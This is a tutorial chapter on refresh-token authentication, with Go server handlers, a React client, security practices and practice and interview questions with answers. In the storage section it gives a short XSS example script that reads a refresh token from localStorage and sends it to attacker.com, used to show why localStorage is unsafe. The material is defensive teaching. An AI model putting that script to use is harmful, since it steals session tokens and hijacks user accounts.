# 2.4 Refresh Tokens

## Why Refresh Tokens?

**Problem with long-lived JWT:**
```
JWT expires in 7 days

Issues:
❌ Stolen token valid for 7 days
❌ Can't revoke logged-out users
❌ Security risk if compromised
```

**Solution: Refresh Token Pattern**
```
Access Token (JWT): 15 minutes
Refresh Token: 7 days (stored server-side)

Benefits:
✅ Short-lived access token (limited damage)
✅ Can revoke refresh tokens (logout works)
✅ Best of both worlds
```

---

## Access Token vs Refresh Token

| Feature | Access Token | Refresh Token |
|---------|--------------|---------------|
| **Type** | JWT | Random string |
| **Lifetime** | Short (15 min) | Long (7-30 days) |
| **Storage** | Client memory | Server database |
| **Purpose** | Access resources | Get new access token |
| **Sent with** | Every API call | Only to refresh endpoint |
| **Revocable** | ❌ No | ✅ Yes |

---

## How It Works

```
┌─────────┐                    ┌─────────┐                    ┌──────────┐
│ Client  │                    │ Server  │                    │ Database │
└────┬────┘                    └────┬────┘                    └────┬─────┘
     │                              │                              │
     │ 1. POST /auth/login          │                              │
     │    { email, password }       │                              │
     │ ──────────────────────────>  │                              │
     │                              │                              │
     │                          2. Validate credentials            │
     │                          3. Generate access token (JWT)     │
     │                          4. Generate refresh token (random) │
     │                          5. Store refresh token ──────────> │
     │                              │                              │
     │ 6. Return both tokens        │                              │
     │ <──────────────────────────  │                              │
     │                              │                              │
     │ 7. Store tokens              │                              │
     │                              │                              │
     │ 8. GET /api/profile          │                              │
     │    Bearer <access_token>     │                              │
     │ ──────────────────────────>  │                              │
     │                          9. Verify access token             │
     │                              │                              │
     │ 10. { user: {...} }          │                              │
     │ <──────────────────────────  │                              │
     │                              │                              │
     │ ... 15 minutes pass ...      │                              │
     │                              │                              │
     │ 11. GET /api/profile         │                              │
     │     Bearer <expired_token>   │                              │
     │ ──────────────────────────>  │                              │
     │                              │                              │
     │ 12. 401 Token Expired        │                              │
     │ <──────────────────────────  │                              │
     │                              │                              │
     │ 13. POST /auth/refresh       │                              │
     │     { refresh_token }        │                              │
     │ ──────────────────────────>  │                              │
     │                          14. Validate refresh token ──────> │
     │                              │ <────────────────────────────│
     │                          15. Generate new access token      │
     │                              │                              │
     │ 16. { access_token }         │                              │
     │ <──────────────────────────  │                              │
     │                              │                              │
     │ 17. Retry with new token     │                              │
```

---

## Database Schema

```sql
CREATE TABLE refresh_tokens (
    id SERIAL PRIMARY KEY,
    token VARCHAR(255) UNIQUE NOT NULL,
    user_id INT NOT NULL REFERENCES users(id),
    expires_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    revoked BOOLEAN DEFAULT FALSE,
    
    INDEX idx_token (token),
    INDEX idx_user_id (user_id)
);
```

---

## Implementation (Go)

### Generate Tokens

```go
package main

import (
    "crypto/rand"
    "encoding/base64"
    "time"
    
    "github.com/golang-jwt/jwt/v5"
)

// Generate random refresh token
func GenerateRefreshToken() (string, error) {
    bytes := make([]byte, 32)
    _, err := rand.Read(bytes)
    if err != nil {
        return "", err
    }
    return base64.URLEncoding.EncodeToString(bytes), nil
}

// Generate access token (JWT)
func GenerateAccessToken(userID int) (string, error) {
    claims := jwt.MapClaims{
        "user_id": userID,
        "exp":     time.Now().Add(15 * time.Minute).Unix(),
        "iat":     time.Now().Unix(),
    }
    
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(secretKey)
}

// Generate both tokens
func GenerateTokenPair(userID int) (string, string, error) {
    accessToken, err := GenerateAccessToken(userID)
    if err != nil {
        return "", "", err
    }
    
    refreshToken, err := GenerateRefreshToken()
    if err != nil {
        return "", "", err
    }
    
    return accessToken, refreshToken, nil
}
```

---

### Store Refresh Token

```go
type RefreshToken struct {
    ID        int
    Token     string
    UserID    int
    ExpiresAt time.Time
    Revoked   bool
    CreatedAt time.Time
}

func SaveRefreshToken(db *sql.DB, userID int, token string, duration time.Duration) error {
    expiresAt := time.Now().Add(duration)
    
    _, err := db.Exec(`
        INSERT INTO refresh_tokens (token, user_id, expires_at)
        VALUES (?, ?, ?)
    `, token, userID, expiresAt)
    
    return err
}
```

---

### Login Handler

```go
func LoginHandler(db *sql.DB) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        var req struct {
            Email    string `json:"email"`
            Password string `json:"password"`
        }
        
        json.NewDecoder(r.Body).Decode(&req)
        
        // Validate credentials
        user, err := ValidateCredentials(db, req.Email, req.Password)
        if err != nil {
            http.Error(w, "Invalid credentials", 401)
            return
        }
        
        // Generate tokens
        accessToken, refreshToken, err := GenerateTokenPair(user.ID)
        if err != nil {
            http.Error(w, "Failed to generate tokens", 500)
            return
        }
        
        // Save refresh token
        err = SaveRefreshToken(db, user.ID, refreshToken, 7*24*time.Hour)
        if err != nil {
            http.Error(w, "Failed to save refresh token", 500)
            return
        }
        
        json.NewEncoder(w).Encode(map[string]interface{}{
            "access_token":  accessToken,
            "refresh_token": refreshToken,
            "token_type":    "Bearer",
            "expires_in":    900, // 15 minutes in seconds
        })
    }
}
```

---

### Refresh Handler

```go
func RefreshHandler(db *sql.DB) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        var req struct {
            RefreshToken string `json:"refresh_token"`
        }
        
        json.NewDecoder(r.Body).Decode(&req)
        
        // Validate refresh token
        var rt RefreshToken
        err := db.QueryRow(`
            SELECT id, user_id, expires_at, revoked
            FROM refresh_tokens
            WHERE token = ?
        `, req.RefreshToken).Scan(&rt.ID, &rt.UserID, &rt.ExpiresAt, &rt.Revoked)
        
        if err != nil {
            http.Error(w, "Invalid refresh token", 401)
            return
        }
        
        // Check if revoked
        if rt.Revoked {
            http.Error(w, "Token has been revoked", 401)
            return
        }
        
        // Check if expired
        if time.Now().After(rt.ExpiresAt) {
            http.Error(w, "Refresh token expired", 401)
            return
        }
        
        // Generate new access token
        newAccessToken, err := GenerateAccessToken(rt.UserID)
        if err != nil {
            http.Error(w, "Failed to generate token", 500)
            return
        }
        
        json.NewEncoder(w).Encode(map[string]interface{}{
            "access_token": newAccessToken,
            "token_type":   "Bearer",
            "expires_in":   900,
        })
    }
}
```

---

### Logout Handler

```go
func LogoutHandler(db *sql.DB) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        var req struct {
            RefreshToken string `json:"refresh_token"`
        }
        
        json.NewDecoder(r.Body).Decode(&req)
        
        // Revoke refresh token
        _, err := db.Exec(`
            UPDATE refresh_tokens
            SET revoked = TRUE
            WHERE token = ?
        `, req.RefreshToken)
        
        if err != nil {
            http.Error(w, "Failed to logout", 500)
            return
        }
        
        w.WriteHeader(204)
    }
}
```

---

## Client-Side Implementation

### React Example

```javascript
import { useState, useEffect } from 'react'

function useAuth() {
    const [accessToken, setAccessToken] = useState(null)
    const [refreshToken, setRefreshToken] = useState(
        localStorage.getItem('refresh_token')
    )
    
    // Login
    async function login(email, password) {
        const response = await fetch('/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        })
        
        const data = await response.json()
        
        setAccessToken(data.access_token)
        setRefreshToken(data.refresh_token)
        localStorage.setItem('refresh_token', data.refresh_token)
    }
    
    // Refresh access token
    async function refresh() {
        const response = await fetch('/auth/refresh', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refresh_token: refreshToken })
        })
        
        if (!response.ok) {
            // Refresh token invalid, logout
            logout()
            return null
        }
        
        const data = await response.json()
        setAccessToken(data.access_token)
        return data.access_token
    }
    
    // API call with auto-refresh
    async function apiCall(url, options = {}) {
        // Try with current access token
        let response = await fetch(url, {
            ...options,
            headers: {
                ...options.headers,
                'Authorization': `Bearer ${accessToken}`
            }
        })
        
        // If 401, refresh and retry
        if (response.status === 401) {
            const newToken = await refresh()
            
            if (!newToken) {
                throw new Error('Session expired')
            }
            
            // Retry with new token
            response = await fetch(url, {
                ...options,
                headers: {
                    ...options.headers,
                    'Authorization': `Bearer ${newToken}`
                }
            })
        }
        
        return response.json()
    }
    
    // Logout
    async function logout() {
        await fetch('/auth/logout', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refresh_token: refreshToken })
        })
        
        setAccessToken(null)
        setRefreshToken(null)
        localStorage.removeItem('refresh_token')
    }
    
    return { login, logout, apiCall }
}

// Usage
function App() {
    const { login, logout, apiCall } = useAuth()
    
    async function fetchProfile() {
        const profile = await apiCall('/api/profile')
        console.log(profile)
    }
    
    return (
        <div>
            <button onClick={() => login('user@example.com', 'password')}>
                Login
            </button>
            <button onClick={fetchProfile}>Get Profile</button>
            <button onClick={logout}>Logout</button>
        </div>
    )
}
```

---

## Security Best Practices

### 1. Rotate Refresh Tokens

**Issue:** Same refresh token used multiple times.

**Solution:** Generate new refresh token on each use.

```go
func RefreshHandler(db *sql.DB) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        // ... validate old refresh token ...
        
        // Generate new access token
        newAccessToken, _ := GenerateAccessToken(rt.UserID)
        
        // Generate NEW refresh token
        newRefreshToken, _ := GenerateRefreshToken()
        
        // Revoke old refresh token
        db.Exec("UPDATE refresh_tokens SET revoked = TRUE WHERE token = ?", 
            req.RefreshToken)
        
        // Save new refresh token
        SaveRefreshToken(db, rt.UserID, newRefreshToken, 7*24*time.Hour)
        
        json.NewEncoder(w).Encode(map[string]interface{}{
            "access_token":  newAccessToken,
            "refresh_token": newRefreshToken,  // New token
        })
    }
}
```

---

### 2. Detect Token Reuse

**Attack:** Attacker steals refresh token and uses it.

**Detection:** If revoked token is used, revoke all user's tokens.

```go
func RefreshHandler(db *sql.DB) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        var req struct {
            RefreshToken string `json:"refresh_token"`
        }
        json.NewDecoder(r.Body).Decode(&req)
        
        var rt RefreshToken
        db.QueryRow(`
            SELECT id, user_id, revoked
            FROM refresh_tokens
            WHERE token = ?
        `, req.RefreshToken).Scan(&rt.ID, &rt.UserID, &rt.Revoked)
        
        // If revoked token is used, possible attack!
        if rt.Revoked {
            // Revoke ALL tokens for this user
            db.Exec("UPDATE refresh_tokens SET revoked = TRUE WHERE user_id = ?", 
                rt.UserID)
            
            http.Error(w, "Security violation detected", 401)
            return
        }
        
        // ... continue normal flow ...
    }
}
```

---

### 3. Store Refresh Token Securely

**Options:**

**❌ Bad: localStorage**
```javascript
localStorage.setItem('refresh_token', token)  // Vulnerable to XSS
```

**✅ Good: httpOnly cookie**
```go
http.SetCookie(w, &http.Cookie{
    Name:     "refresh_token",
    Value:    refreshToken,
    HttpOnly: true,  // JavaScript can't access
    Secure:   true,  // HTTPS only
    SameSite: http.SameSiteStrictMode,
    MaxAge:   604800,  // 7 days
})
```

**✅ Good: Secure storage (React Native)**
```javascript
import * as SecureStore from 'expo-secure-store'

await SecureStore.setItemAsync('refresh_token', token)
```

---

### 4. Limit Active Refresh Tokens

```go
// When creating new refresh token, delete old ones
func SaveRefreshToken(db *sql.DB, userID int, token string) error {
    // Delete old tokens (keep only latest 5)
    db.Exec(`
        DELETE FROM refresh_tokens
        WHERE user_id = ?
        AND id NOT IN (
            SELECT id FROM refresh_tokens
            WHERE user_id = ?
            ORDER BY created_at DESC
            LIMIT 5
        )
    `, userID, userID)
    
    // Insert new token
    _, err := db.Exec(`
        INSERT INTO refresh_tokens (token, user_id, expires_at)
        VALUES (?, ?, ?)
    `, token, userID, time.Now().Add(7*24*time.Hour))
    
    return err
}
```

---

### 5. Add Device/IP Tracking

```go
type RefreshToken struct {
    ID        int
    Token     string
    UserID    int
    DeviceID  string  // Track device
    IPAddress string  // Track IP
    ExpiresAt time.Time
    Revoked   bool
}

func SaveRefreshToken(db *sql.DB, userID int, token, deviceID, ip string) error {
    _, err := db.Exec(`
        INSERT INTO refresh_tokens (token, user_id, device_id, ip_address, expires_at)
        VALUES (?, ?, ?, ?, ?)
    `, token, userID, deviceID, ip, time.Now().Add(7*24*time.Hour))
    
    return err
}

// Revoke all tokens except current device
func LogoutOtherDevices(db *sql.DB, userID int, currentDeviceID string) error {
    _, err := db.Exec(`
        UPDATE refresh_tokens
        SET revoked = TRUE
        WHERE user_id = ? AND device_id != ?
    `, userID, currentDeviceID)
    
    return err
}
```

---

## Refresh Token Strategies

### Strategy 1: Non-Rotating (Reusable)

**Same refresh token used multiple times until expiry.**

```
Pros:
✅ Simple
✅ Works with multiple devices

Cons:
❌ If stolen, valid until expiry
❌ Less secure
```

---

### Strategy 2: Rotating (One-Time Use)

**New refresh token generated on each use.**

```
Pros:
✅ More secure
✅ Can detect reuse

Cons:
⚠️ Complex
⚠️ Need to handle concurrent requests
```

---

### Strategy 3: Hybrid

**Refresh token valid for X uses or Y days.**

```go
type RefreshToken struct {
    Token      string
    UserID     int
    UsesLeft   int  // e.g., 5 uses
    ExpiresAt  time.Time
}

func UseRefreshToken(db *sql.DB, token string) (*RefreshToken, error) {
    var rt RefreshToken
    db.QueryRow(`
        SELECT token, user_id, uses_left, expires_at
        FROM refresh_tokens
        WHERE token = ?
    `, token).Scan(&rt.Token, &rt.UserID, &rt.UsesLeft, &rt.ExpiresAt)
    
    if rt.UsesLeft <= 0 {
        return nil, errors.New("token exhausted")
    }
    
    // Decrement uses
    db.Exec("UPDATE refresh_tokens SET uses_left = uses_left - 1 WHERE token = ?", token)
    
    return &rt, nil
}
```

---

## Practice Questions

<details>
<summary><strong>View Questions</strong></summary>

### Fill in the Blanks

1. Access tokens typically expire in __________ minutes, while refresh tokens last __________ days.
2. Refresh tokens are stored __________ (client-side/server-side).
3. When a refresh token is used, it's best practice to __________ it.
4. If a revoked refresh token is used, it may indicate a __________ attack.

### True/False

1. ⬜ Refresh tokens should be JWT
2. ⬜ Access tokens can be revoked before expiry
3. ⬜ Refresh tokens should be stored in localStorage
4. ⬜ Rotating refresh tokens are more secure than reusable ones
5. ⬜ You should generate a new access token every API call

### Multiple Choice

1. What is the main purpose of refresh tokens?
   - A) To access API resources
   - B) To get new access tokens
   - C) To verify user identity
   - D) To encrypt data

2. Where should refresh tokens be stored on the client?
   - A) localStorage
   - B) sessionStorage
   - C) httpOnly cookie
   - D) In-memory variable

3. What should you do if a revoked refresh token is used?
   - A) Ignore it
   - B) Return a new token
   - C) Revoke all user's tokens
   - D) Delete the user account

---

### Answers

<details>
<summary><strong>View Answers</strong></summary>

**Fill in the Blanks:**
1. 15 (or 5-30), 7 (or 7-30)
2. server-side
3. rotate (or revoke and generate new)
4. token theft (or security)

**True/False:**
1. ❌ False - Refresh tokens should be random strings, not JWT
2. ❌ False - JWT access tokens cannot be revoked; only refresh tokens can
3. ❌ False - Should be in httpOnly cookie or secure storage (not localStorage)
4. ✅ True - Rotating tokens provide better security
5. ❌ False - Only when access token expires (every 15 minutes)

**Multiple Choice:**
1. **B** - To get new access tokens when old ones expire
2. **C** - httpOnly cookie (most secure, XSS protection)
3. **C** - Revoke all user's tokens (security violation)

</details>

</details>

---

## Interview Questions

<details>
<summary><strong>View Questions</strong></summary>

### Question 1: Why use refresh tokens instead of long-lived access tokens?

### Question 2: Explain the complete flow from login to token refresh

### Question 3: How would you implement refresh token rotation?

### Question 4: How do you detect and prevent refresh token theft?

### Question 5: What are the security considerations for storing refresh tokens?

---

### Answers

<details>
<summary><strong>View Answers</strong></summary>

### Answer 1: Why refresh tokens?

**Problem with long-lived access tokens:**

```
Access token expires in: 30 days

Issues:
❌ User logs out → Token still valid for 30 days
❌ Token stolen → Valid for 30 days
❌ Can't revoke JWT tokens
❌ Compromised token = long-term access
```

**Solution: Refresh token pattern**

```
Access token (JWT): 15 minutes
Refresh token: 7 days (stored server-side)
```

**Benefits:**

**1. Limited exposure window**
```
If access token stolen: Only valid 15 minutes
If refresh token stolen: Can be revoked immediately
```

**2. Immediate revocation**
```
User logs out:
- Access token expires in < 15 min (automatic)
- Refresh token deleted from database (immediate)
- User can't get new access tokens
```

**3. Stateless API calls**
```
Most requests: Use JWT access token (stateless, fast)
Few requests: Refresh endpoint needs database (rare)
```

**4. Better security posture**
```
Access token: In memory (cleared on page refresh)
Refresh token: httpOnly cookie (XSS protection)
```

**Real-world analogy:**

```
Hotel key card system:
- Access token = Room key (expires daily)
- Refresh token = Front desk can issue new keys

If key stolen:
- Only works for today
- Hotel can deactivate and issue new key
```

**Trade-offs:**

| Long-lived JWT | Refresh Token Pattern |
|----------------|----------------------|
| Simple | More complex |
| Stateless | Partially stateful |
| Can't revoke | Can revoke |
| High risk if stolen | Low risk |

---

### Answer 2: Complete flow

**1. Initial Login**

```
Client                          Server                      Database
  │                               │                            │
  │ POST /auth/login              │                            │
  │ { email, password }           │                            │
  │ ────────────────────────────> │                            │
  │                               │                            │
  │                           Validate credentials             │
  │                           Generate access token (JWT)      │
  │                           Generate refresh token (random)  │
  │                           Store refresh token ──────────>  │
  │                               │                            │
  │ { access_token,               │                            │
  │   refresh_token }             │                            │
  │ <──────────────────────────── │                            │
  │                               │                            │
  Store:                          │                            │
  - access_token in memory        │                            │
  - refresh_token in cookie       │                            │
```

**Response:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "a8f3k2p9m1q7z5x4w6n2b8v5c1d9e7f0",
  "token_type": "Bearer",
  "expires_in": 900
}
```

---

**2. Using Access Token**

```
Client                          Server
  │                               │
  │ GET /api/profile              │
  │ Authorization: Bearer eyJh... │
  │ ────────────────────────────> │
  │                               │
  │                           Verify JWT signature
  │                           Check expiration
  │                           Extract user_id from payload
  │                               │
  │ { user: {...} }               │
  │ <──────────────────────────── │
```

---

**3. Access Token Expires**

```
Client                          Server
  │                               │
  │ GET /api/profile              │
  │ Authorization: Bearer expired │
  │ ────────────────────────────> │
  │                               │
  │                           Check expiration
  │                           Token expired!
  │                               │
  │ 401 Unauthorized              │
  │ { error: "Token expired" }    │
  │ <──────────────────────────── │
```

---

**4. Refresh Access Token**

```
Client                          Server                      Database
  │                               │                            │
  │ POST /auth/refresh            │                            │
  │ Cookie: refresh_token=a8f3... │                            │
  │ ────────────────────────────> │                            │
  │                               │                            │
  │                           Extract refresh token            │
  │                           Validate in database ─────────>  │
  │                               │ <──────────────────────────│
  │                               │   { user_id: 123,          │
  │                               │     expires_at: ...,       │
  │                               │     revoked: false }       │
  │                               │                            │
  │                           Check expiration                 │
  │                           Check not revoked                │
  │                           Generate new access token        │
  │                               │                            │
  │ { access_token }              │                            │
  │ <──────────────────────────── │                            │
  │                               │                            │
  Store new access_token          │                            │
```

---

**5. Logout**

```
Client                          Server                      Database
  │                               │                            │
  │ POST /auth/logout             │                            │
  │ Cookie: refresh_token=a8f3... │                            │
  │ ────────────────────────────> │                            │
  │                               │                            │
  │                           Revoke refresh token ─────────>  │
  │                               │   UPDATE refresh_tokens    │
  │                               │   SET revoked = TRUE       │
  │                               │                            │
  │ 204 No Content                │                            │
  │ <──────────────────────────── │                            │
  │                               │                            │
  Clear tokens                    │                            │
```

---

**Complete Code Example:**

```go
// Login
func Login(w http.ResponseWriter, r *http.Request, db *sql.DB) {
    // 1. Validate credentials
    user := validateCredentials(email, password)
    
    // 2. Generate tokens
    accessToken := generateJWT(user.ID, 15*time.Minute)
    refreshToken := generateRandomString(32)
    
    // 3. Store refresh token
    db.Exec(`
        INSERT INTO refresh_tokens (token, user_id, expires_at)
        VALUES (?, ?, ?)
    `, refreshToken, user.ID, time.Now().Add(7*24*time.Hour))
    
    // 4. Set httpOnly cookie
    http.SetCookie(w, &http.Cookie{
        Name:     "refresh_token",
        Value:    refreshToken,
        HttpOnly: true,
        Secure:   true,
        MaxAge:   604800,
    })
    
    // 5. Return access token
    json.NewEncoder(w).Encode(map[string]string{
        "access_token": accessToken,
    })
}

// Refresh
func Refresh(w http.ResponseWriter, r *http.Request, db *sql.DB) {
    // 1. Get refresh token from cookie
    cookie, _ := r.Cookie("refresh_token")
    refreshToken := cookie.Value
    
    // 2. Validate from database
    var userID int
    var expiresAt time.Time
    db.QueryRow(`
        SELECT user_id, expires_at
        FROM refresh_tokens
        WHERE token = ? AND revoked = FALSE
    `, refreshToken).Scan(&userID, &expiresAt)
    
    // 3. Check expiration
    if time.Now().After(expiresAt) {
        http.Error(w, "Refresh token expired", 401)
        return
    }
    
    // 4. Generate new access token
    newAccessToken := generateJWT(userID, 15*time.Minute)
    
    // 5. Return new access token
    json.NewEncoder(w).Encode(map[string]string{
        "access_token": newAccessToken,
    })
}
```

---

### Answer 3: Refresh token rotation

**Concept:** Generate new refresh token on each use, revoke old one.

**Benefits:**
- Limits damage if token stolen
- Can detect token reuse (security breach)
- More secure than reusable tokens

**Implementation:**

```go
func RotatingRefresh(w http.ResponseWriter, r *http.Request, db *sql.DB) {
    // 1. Get old refresh token
    cookie, _ := r.Cookie("refresh_token")
    oldRefreshToken := cookie.Value
    
    // 2. Validate old token
    var userID int
    var revoked bool
    err := db.QueryRow(`
        SELECT user_id, revoked
        FROM refresh_tokens
        WHERE token = ?
    `, oldRefreshToken).Scan(&userID, &revoked)
    
    if err != nil {
        http.Error(w, "Invalid refresh token", 401)
        return
    }
    
    // 3. CRITICAL: If revoked token used, possible theft!
    if revoked {
        // Revoke ALL user's refresh tokens
        db.Exec("UPDATE refresh_tokens SET revoked = TRUE WHERE user_id = ?", userID)
        
        // Alert security team
        alertSecurityTeam(userID, "Revoked token reuse detected")
        
        http.Error(w, "Security violation detected", 401)
        return
    }
    
    // 4. Generate new tokens
    newAccessToken := generateJWT(userID, 15*time.Minute)
    newRefreshToken := generateRandomString(32)
    
    // 5. Transaction: Revoke old, create new
    tx, _ := db.Begin()
    
    // Revoke old refresh token
    tx.Exec("UPDATE refresh_tokens SET revoked = TRUE WHERE token = ?", oldRefreshToken)
    
    // Create new refresh token
    tx.Exec(`
        INSERT INTO refresh_tokens (token, user_id, expires_at)
        VALUES (?, ?, ?)
    `, newRefreshToken, userID, time.Now().Add(7*24*time.Hour))
    
    tx.Commit()
    
    // 6. Set new refresh token cookie
    http.SetCookie(w, &http.Cookie{
        Name:     "refresh_token",
        Value:    newRefreshToken,
        HttpOnly: true,
        Secure:   true,
        MaxAge:   604800,
    })
    
    // 7. Return new access token
    json.NewEncoder(w).Encode(map[string]string{
        "access_token": newAccessToken,
    })
}
```

**Client-side handling:**

```javascript
async function refreshToken() {
    const response = await fetch('/auth/refresh', {
        method: 'POST',
        credentials: 'include'  // Send cookies
    })
    
    const data = await response.json()
    
    // New access token returned
    // New refresh token automatically set in cookie
    return data.access_token
}
```

**Security Flow:**

```
Normal usage:
1. Use refresh token A → Get new access token + refresh token B
2. Use refresh token B → Get new access token + refresh token C
3. Use refresh token C → Get new access token + refresh token D

Theft detected:
1. Attacker uses old refresh token B
2. Server sees B is revoked
3. ALERT! Revoke all user's tokens
4. Force re-login
```

---

### Answer 4: Detect & prevent theft

**Detection Strategies:**

**1. Token Reuse Detection**

```go
if refreshToken.Revoked {
    // This token was already used!
    // Possible theft - revoke everything
    
    db.Exec(`
        UPDATE refresh_tokens
        SET revoked = TRUE
        WHERE user_id = ?
    `, refreshToken.UserID)
    
    // Notify user via email
    sendSecurityAlert(user.Email, "Unusual activity detected")
    
    return errors.New("security violation")
}
```

**2. IP Address Tracking**

```go
type RefreshToken struct {
    Token          string
    UserID         int
    IPAddress      string  // IP when token was created
    LastUsedIP     string  // IP of last use
    LastUsedAt     time.Time
}

func ValidateRefreshToken(token, currentIP string) error {
    var rt RefreshToken
    db.QueryRow(`
        SELECT token, user_id, ip_address, last_used_ip
        FROM refresh_tokens
        WHERE token = ?
    `, token).Scan(&rt.Token, &rt.UserID, &rt.IPAddress, &rt.LastUsedIP)
    
    // Check if IP changed drastically
    if !sameRegion(currentIP, rt.LastUsedIP) {
        // Unusual location, require additional verification
        return errors.New("location verification required")
    }
    
    // Update last used IP
    db.Exec(`
        UPDATE refresh_tokens
        SET last_used_ip = ?, last_used_at = ?
        WHERE token = ?
    `, currentIP, time.Now(), token)
    
    return nil
}
```

**3. Device Fingerprinting**

```go
type RefreshToken struct {
    DeviceID       string  // Browser fingerprint
    UserAgent      string
    LastUsedDevice string
}

func ValidateDevice(token, deviceID string) error {
    var rt RefreshToken
    db.QueryRow(`
        SELECT device_id
        FROM refresh_tokens
        WHERE token = ?
    `, token).Scan(&rt.DeviceID)
    
    if rt.DeviceID != deviceID {
        // Different device using same token
        return errors.New("device mismatch")
    }
    
    return nil
}
```

**4. Rate Limiting**

```go
// Limit refresh attempts per user
func checkRateLimit(userID int) bool {
    var count int
    db.QueryRow(`
        SELECT COUNT(*)
        FROM refresh_attempts
        WHERE user_id = ?
        AND attempted_at > ?
    `, userID, time.Now().Add(-1*time.Hour)).Scan(&count)
    
    if count > 10 {  // Max 10 refreshes per hour
        return false
    }
    
    return true
}
```

**Prevention Strategies:**

**1. Short Expiration**
```go
// 7 days max
expiresAt := time.Now().Add(7 * 24 * time.Hour)
```

**2. Token Rotation**
```go
// New token on each use
```

**3. Secure Storage**
```go
// httpOnly cookie (not localStorage)
http.SetCookie(w, &http.Cookie{
    Name:     "refresh_token",
    Value:    token,
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteStrictMode,
})
```

**4. Limit Active Tokens**
```go
// Max 5 active devices per user
db.Exec(`
    DELETE FROM refresh_tokens
    WHERE user_id = ?
    AND id NOT IN (
        SELECT id FROM refresh_tokens
        WHERE user_id = ?
        ORDER BY created_at DESC
        LIMIT 5
    )
`, userID, userID)
```

---

### Answer 5: Storage considerations

**Client-side storage options:**

**1. httpOnly Cookie ✅ Recommended**

```go
http.SetCookie(w, &http.Cookie{
    Name:     "refresh_token",
    Value:    refreshToken,
    HttpOnly: true,         // JavaScript can't access
    Secure:   true,         // HTTPS only
    SameSite: http.SameSiteStrictMode,  // CSRF protection
    MaxAge:   604800,       // 7 days
    Path:     "/auth",      // Only sent to auth endpoints
})
```

**Pros:**
- ✅ Not accessible via JavaScript (XSS protection)
- ✅ Automatically sent with requests
- ✅ Secure and HttpOnly flags

**Cons:**
- ⚠️ Vulnerable to CSRF (mitigate with SameSite)
- ⚠️ CORS complexity

---

**2. localStorage ❌ Not Recommended**

```javascript
localStorage.setItem('refresh_token', token)
```

**Pros:**
- Simple
- Persists across sessions

**Cons:**
- ❌ Accessible to any JavaScript (XSS)
- ❌ Exposed if malicious script injected

**XSS attack example:**
```javascript
// Malicious script:
const token = localStorage.getItem('refresh_token')
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
})
```

---

**3. Secure Storage (Mobile) ✅ Good**

```javascript
// React Native
import * as SecureStore from 'expo-secure-store'

await SecureStore.setItemAsync('refresh_token', token)
const token = await SecureStore.getItemAsync('refresh_token')
```

**Pros:**
- ✅ OS-level encryption
- ✅ Not accessible to other apps
- ✅ Persistent

---

**Server-side storage:**

**Required fields:**
```sql
CREATE TABLE refresh_tokens (
    id SERIAL PRIMARY KEY,
    token VARCHAR(255) UNIQUE NOT NULL,
    user_id INT NOT NULL,
    expires_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT NOW(),
    revoked BOOLEAN DEFAULT FALSE,
    
    -- Security fields
    ip_address VARCHAR(45),
    user_agent TEXT,
    device_id VARCHAR(255),
    last_used_at TIMESTAMP,
    last_used_ip VARCHAR(45),
    
    INDEX idx_token (token),
    INDEX idx_user_id (user_id),
    INDEX idx_expires_at (expires_at)
);
```

**Cleanup strategy:**
```go
// Delete expired tokens (run daily)
func CleanupExpiredTokens(db *sql.DB) {
    db.Exec(`
        DELETE FROM refresh_tokens
        WHERE expires_at < NOW()
        OR revoked = TRUE AND created_at < NOW() - INTERVAL '30 days'
    `)
}
```

**Best practices:**

1. ✅ Hash refresh tokens before storing
2. ✅ Set appropriate expiration
3. ✅ Index for fast lookup
4. ✅ Track usage patterns
5. ✅ Cleanup old tokens regularly

</details>

</details>